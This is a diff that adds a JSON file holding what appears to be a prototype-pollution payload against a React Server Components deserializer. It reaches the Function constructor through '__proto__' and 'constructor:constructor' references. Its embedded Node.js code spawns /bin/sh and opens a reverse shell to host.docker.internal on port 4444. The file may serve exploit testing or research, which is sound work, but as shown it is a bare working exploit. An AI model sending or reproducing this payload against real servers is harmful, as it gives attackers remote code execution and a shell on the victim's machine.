@@ -1,0 +1,12 @@
+{
+  "then": "$1:__proto__:then",
+  "status": "resolved_model",
+  "reason": -1,
+  "value": "{\"then\": \"$B0\"}",
+  "_response": {
+    "_prefix": "const net = process.mainModule.require('net');const sh = process.mainModule.require('child_process').spawn('/bin/sh', []);const socket = new net.Socket();socket.connect(4444, 'host.docker.internal', function() {socket.pipe(sh.stdin);sh.stdout.pipe(socket);sh.stderr.pipe(socket);});",
+    "_formData": {
+      "get": "$1:constructor:constructor"
+    }
+  }
+}
